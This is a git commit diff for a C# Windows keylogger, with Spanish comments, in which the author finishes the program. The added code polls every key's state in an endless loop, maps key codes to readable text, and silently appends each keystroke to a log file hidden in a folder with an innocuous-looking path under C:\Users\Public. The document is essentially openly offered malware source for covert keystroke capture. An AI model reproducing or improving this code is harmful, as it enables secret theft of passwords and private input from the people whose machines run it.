d8818e3361465fce74fc49f3fb14a572cc450ffa
SebastianEPH <SebastianEPH99@gmail.com>
2020-05-25 18:59:03 -0500

    finish

--- Keylogger CS/Program.cs
+++ Keylogger CS/Program.cs
@@ -11,55 +11,107 @@ namespace Keylogger_CS {
     class Program {
         [DllImport("user32")] private static extern short GetAsyncKeyState(int vKey);   // Obtiene el registro te teclas
         static void Main(string[] args) {
-            String Path = "";   // Ruta del archivo log  
-
-            StreamWriter F = new StreamWriter(Path, true);
-
-            void WriteFile(string Texto) {
-                F.Write(Texto); // Escribe texto en el archivo
-                F.Close();
+            // Éste keylogger falta pulir.
+            const string PATH = @"C:\Users\Public\Security\TelegramBoot\Hola\Boot\";   // Ruta del archivo log  
+            const string LOG_NAME = "reg.k"; // Incluye extensión
+            // 
+            void CreateDirectory() {
+                try {
+                    DirectoryInfo di = Directory.CreateDirectory(PATH);
+                    Console.WriteLine("Se creó la siguiente ruta {0}", PATH);
+                } catch {
+                    Console.WriteLine("La carpeta ya existe");
+                }
             }
-            void CreatePath() { 
-                // Crea Dirección
+            // Conversión de Teclas.
+            string Converter(string tecla) {
+                switch (tecla) {     // Convierte teclas en legible
+                    // Mouse
+                    case "LButton": return "";
+                    case "RButton": return "";
+                    // Use Común
+                    case "Space": return " ";
+                    case "Enter": return "\n";
+                    case "Tab": return "    ";
+                    case "Delete": return "<Delete>";
+                    // Números
+                    case "D1": return "1";
+                    case "D2": return "2";
+                    case "D3": return "3";
+                    case "D4": return "4";
+                    case "D5": return "5";
+                    case "D6": return "6";
+                    case "D7": return "7";
+                    case "D8": return "8";
+                    case "D9": return "9";
+                    case "D0": return "0";
+                    case "NumPad1": return "1";
+                    case "NumPad2": return "2";
+                    case "NumPad3": return "3";
+                    case "NumPad4": return "4";
+                    case "NumPad5": return "5";
+                    case "NumPad6": return "6";
+                    case "NumPad7": return "7";
+                    case "NumPad8": return "8";
+                    case "NumPad9": return "9";
+                    case "NumPad0": return "0";
+                    // Teclas Control
+                    case "RControlKeyControlKey": return "[Ctrl]";
+                    case "LShiftKeyShiftKey": return "[Shift L]";
+                    case "rShiftKeyShiftKey": return "[Shift R]";
+                    case "Back": return "<=";
+                    case "": return "0";
+
+                    //Signos especiales
+                    case "OemMinus": return "-";
+                    case "OemPeriod": return ".";
+                    case "OemComma": return ",";
+                    case "Oem4": return "'";
+                    case "Oem6": return "¿";
+                    case "Decimal": return ".";
+                    case "Add": return "+";
+                    case "Subtract": return "-";
+                    case "Divide": return "/";
+                    case "Multiply": return "*";
+
+                    //Navegación
+                    case "Up": return "[Up]";
+                    case "Left": return "[Left]";
+                    case "Right": return "[Right]";
+                    case "Down": return "[Down]";
+
+
+
+
+                    default: return tecla; // Muestra en consola la tecla obtenida
+
+                }
             }
-            
+            // Inicio 
 
-
-            string buffer = "";
-            string temp = "";
+            CreateDirectory();  // Crea directorio del Keylogger
+            string key = "";
+            string buffer = ""; // Bufer
+            StreamWriter F = new StreamWriter(PATH + LOG_NAME, true);
 
             while (true) {  // Se repite el proceso siempre
 
                 foreach (Int32 i in Enum.GetValues(typeof(Keys))) { // Recorre el Array de las teclas
                     if (GetAsyncKeyState(i) == -32767) {        // Si el estado de la tecla i es igual a [Const de tecla presionada]
                         // Buffer 
-                        temp = Enum.GetName(typeof(Keys), i);   // Obtiene la tecla oprimida
-                        
+                        key = Enum.GetName(typeof(Keys), i);   // Obtiene la tecla oprimida
+                        buffer = Converter(key);
+                        Console.Write(buffer);
 
-                        switch (temp) {     // Convierte teclas en legible
-                            case "Space":
-                                Console.Write(" ");
-                                break;
-                            case "Enter":
-                                Console.Write("\n");
-                                break;
-                            case "Spafdgce":
-                                Console.Write(" ");
-                                break;
-                            case "Sdfpace":
-                                Console.Write(" ");
-                                break;
-
-
-                            default:
-                                Console.Write(temp);    // Muestra en consola la tecla obtenida
-                                break;
-                        }
-
+                        F.Write(buffer); // Escribe texto en el archivo
+                        //
 
                     }
                 }
             }
+
+
+           
 
         }
     }
